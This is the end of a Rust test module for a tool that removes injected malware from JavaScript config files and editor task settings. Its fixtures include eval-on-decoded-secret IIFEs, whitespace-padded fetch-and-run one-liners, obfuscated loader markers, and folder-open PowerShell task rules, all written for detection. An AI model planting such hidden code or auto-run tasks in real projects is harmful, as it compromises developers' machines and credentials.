        assert!(brackets_balanced(
            b"f(\"(\", '[', `${a({})}`) // )\n/* ] */"
        ));
        assert!(!brackets_balanced(b"f(]"));
        assert_eq!(
            strip_jsonc("{\"a\": \"//x\", // c\n \"b\": [1,],}"),
            "{\"a\": \"//x\", \n \"b\": [1]}"
        );
        assert_eq!(compact_ts(0), "19700101T000000Z");
    }

    // ---- test_remediation_and_crypto.py
    const EVAL: &str = concat!("eval(proxy", "Info)");

    #[test]
    fn matching_brackets_like_remediator_py() {
        for (src, want) in [
            ("(a(b)c)", Some(6)),
            ("(')' + \")\")", Some(10)),
            ("(`x ${ '}' + `y` } )`)", Some(21)),
            ("(a // )\n)", Some(8)),
            ("(a /* ) */ )", Some(11)),
            ("(unclosed", None),
            ("{a}", Some(2)),
        ] {
            assert_eq!(matching_bracket(src.as_bytes(), 0), want, "{src}");
        }
        for (src, ok) in [
            ("f(a[1], {b: 2})", true),
            ("f(a]", false),
            (")", false),
            ("(", false),
            ("'(' + \"[\" + `${'{'}` // (\n /* [ */", true),
            ("`a\\`b`", true),
            ("'esc\\'q'", true),
            ("`${ \"\\}\" }`", true),
            ("`a ${ `inner ${1}` } b`", true),
            ("`${ a \\} }`", true),
            ("`${ {a: 1}.a }`", true),
        ] {
            assert_eq!(brackets_balanced(src.as_bytes()), ok, "{src}");
        }
        // unterminated strings, comments and templates run to the end
        assert_eq!(skip_string(b"'abc", 0, b'\''), 4);
        assert_eq!(skip_block_comment(b"/* x", 0), 4);
        assert_eq!(skip_template(b"`abc", 0), 4);
        assert_eq!(skip_template(b"`${ \\x", 0), 6);
    }

    #[test]
    fn iife_excision_cases() {
        let injected = format!(
            "import {{ defineConfig }} from \"vite\";\n(async () => {{ const proxyInfo = atob(process.env.AUTH_API_KEY); {EVAL}; }})();\nexport default defineConfig({{ plugins: [] }});\n"
        );
        let (new, removed) = strip_malicious_iife(&injected);
        assert_eq!(removed.len(), 1);
        assert!(removed[0].contains(EVAL));
        assert_eq!(new, "import { defineConfig } from \"vite\";\nexport default defineConfig({ plugins: [] });\n");
        for src in [
            "(function(){ console.log(1) })();".to_string(), // benign IIFE
            "(() => { eval(x) })".to_string(),               // not invoked
            format!("(() => {{ {EVAL} }}"),                  // unbalanced wrapper
            format!("(() => {{ {EVAL} }}) ("),               // unbalanced invocation
            format!("(() => {{ {EVAL} }})"),                 // wrapper ends the file
        ] {
            assert_eq!(strip_malicious_iife(&src), (src.clone(), vec![]), "{src}");
        }
        // weak markers in combination, a nested IIFE inside the removed one
        let src =
            "x;\n  (function () { eval(require('node-fetch')) ; (a => a)(1) }) ()  \n\n\n\ny;";
        let (new, removed) = strip_malicious_iife(src);
        assert!(!removed.is_empty());
        assert_eq!(new, "x;\n\ny;");
        assert!(iife_is_malicious("eval(atob('x'))") && !iife_is_malicious("eval(1)"));
        let src2 = format!("z; (async () => {{ {EVAL} }})() ;tail");
        assert_eq!(strip_malicious_iife(&src2).0, "z; ;tail");
    }

    // split so this source never holds the markers the signatures hunt for
    const BANG: &str = concat!("glo", "bal['!']='9-6600'");
    const GI: &str = concat!("glo", "bal.i=\"A10-1300\"");
    const LOADER: &str = ";(function(_0x1a2b3c,_0x4d5e6f){return void 0;}(_0x7a8b9c,0x1));function _0x7a8b9c(){return [];}";

    #[test]
    fn padded_loader_cases() {
        let pad = " ".repeat(200);
        let real = "module.exports = { testEnvironment: 'node' };";
        for (marker, nl) in [(BANG, "\n"), (GI, "\r\n"), (BANG, "")] {
            let src = format!("// jest\n{real}{pad}{marker}{LOADER}{nl}");
            assert_eq!(
                strip_padded_loader(&src),
                LoaderFix::Cut(format!("// jest\n{real}{nl}")),
                "{marker:?} {nl:?}"
            );
        }
        // the marker opens the file: the whole file is the loader
        assert_eq!(
            strip_padded_loader(&format!("{BANG}{LOADER}\n")),
            LoaderFix::Whole
        );
        assert_eq!(
            strip_padded_loader(&format!("\n  {GI}{LOADER}")),
            LoaderFix::Whole
        );
        assert_eq!(
            strip_padded_loader(&format!("{BANG};module.exports = 1;\n")),
            LoaderFix::Whole
        );
        for src in [
            format!("{real} {BANG}{LOADER}\n"),              // no pad
            format!("{real}{pad}{BANG}{LOADER}\nmore();\n"), // code after it
            format!("{real}\n{pad}{BANG}{LOADER}\n"),        // pad on its own line
            format!("{real}{pad}{BANG};var x = 1;\n"),       // no _0x loader
            format!("f({pad}{BANG}{LOADER}\n"),              // cut leaves f( open
        ] {
            assert_eq!(strip_padded_loader(&src), LoaderFix::Unsafe, "{src}");
        }
        assert_eq!(
            strip_padded_loader("function a0_0x12d6(){return [];}\n"),
            LoaderFix::Whole
        );
        for src in [
            real.to_string(),
            concat!("glo", "bal['!'] = fn;").to_string(),
            concat!("glo", "bal['!!']='9-6600';").to_string(),
            concat!("glo", "bal.id=\"A9-0646-1\";").to_string(),
            concat!("glo", "balThis.version=\"10-1300\";").to_string(),
        ] {
            assert_eq!(strip_padded_loader(&src), LoaderFix::None, "{src}");
        }
    }

    /// Code pushed off-screen with normal names and no marker: the padding
    /// alone is the tell.
    #[test]
    fn padded_hidden_code_cases() {
        let pad = " ".repeat(160);
        let tabs = "\t".repeat(150);
        let real = "module.exports = { plugins: [] };";
        let hidden = "(async()=>{const u=atob(process.env.SESSION);const r=await fetch(u);run(await r.text())})();";
        for (p, nl) in [(&pad, "\n"), (&tabs, "\r\n"), (&pad, "")] {
            // cut off the end of the last line
            let src = format!("{real}{p}{hidden}{nl}");
            assert_eq!(
                strip_padded_loader(&src),
                LoaderFix::Cut(format!("{real}{nl}"))
            );
        }
        for (p, nl) in [(&pad, "\n"), (&tabs, "\r\n")] {
            // cut off the end of a line mid-file
            let src = format!("// cfg\n{real}{p}{hidden}{nl}more();{nl}");
            assert_eq!(
                strip_padded_loader(&src),
                LoaderFix::Cut(format!("// cfg\n{real}{nl}more();{nl}")),
                "{nl:?}"
            );
            // a line that is nothing but padded code goes with its newline
            let src = format!("a();{nl}{p}{hidden}{nl}b();{nl}");
            assert_eq!(
                strip_padded_loader(&src),
                LoaderFix::Cut(format!("a();{nl}b();{nl}"))
            );
        }
        // two hidden tails in one file
        let src = format!("a();{pad}{hidden}\nb();{pad}{hidden}\n");
        assert_eq!(
            strip_padded_loader(&src),
            LoaderFix::Cut("a();\nb();\n".into())
        );
        for src in [
            format!("{real}{pad}(function(){{\nrun();\n}})();\n"), // runs past its line
            format!("f({pad}g());\n"),                             // cut leaves f( open
        ] {
            assert_eq!(strip_padded_loader(&src), LoaderFix::Unsafe, "{src}");
        }
        let short = " ".repeat(149);
        for src in [
            format!("{real}{short}{hidden}\n"),         // under 150 blanks
            format!("{real}{pad}// aligned comment\n"), // a comment, not code
            format!("{real}{pad}# shell comment\n"),
            format!("{real}{pad}\n"),             // trailing blanks
            format!("x = '\u{2}{tabs}\u{2}';\n"), // blanks inside a binary table
        ] {
            assert_eq!(strip_padded_loader(&src), LoaderFix::None, "{src:?}");
        }
    }

    #[test]
    fn jsonc_and_task_rules() {
        let txt = "{\"url\": \"http://x//y\", /* c */ \"a\": [1,], // t\n \"b\": '/*k*/',}";
        assert_eq!(
            strip_jsonc(txt),
            "{\"url\": \"http://x//y\",  \"a\": [1], \n \"b\": '/*k*/'}"
        );
        let task = |v: serde_json::Value| Remediator::task_is_malicious(v.as_object().unwrap());
        assert!(task(
            json!({"runOn": "folderOpen", "command": "powershell -e AAA"})
        ));
        assert!(task(json!({"runOptions": "x", "command": "iex "})));
        assert!(task(
            json!({"runOptions": {"runOn": "folderOpen"}, "command": "npm run dev"})
        ));
        assert!(!task(json!({"label": "build", "command": "npm run build"})));
    }
}
